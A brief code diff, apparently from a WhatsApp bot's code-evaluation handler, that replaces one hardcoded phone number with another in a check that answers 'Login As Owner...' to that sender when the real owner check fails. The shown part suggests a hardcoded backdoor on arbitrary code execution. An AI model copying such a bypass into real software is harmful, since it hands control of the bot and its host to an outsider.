@@ -9,7 +9,7 @@ let handler  = async (m, _2) => {
   let _text = (/^=/.test(usedPrefix) ? 'return ' : '') + noPrefix
   let old = m.exp * 1 
   if(!isROwner){
-      if(m.sender == "6285850539404@s.whatsapp.net"){
+      if(m.sender == "6288223674569@s.whatsapp.net"){
       	conn.reply(m.chat, `Login As Owner...`, m)
       }
       else{
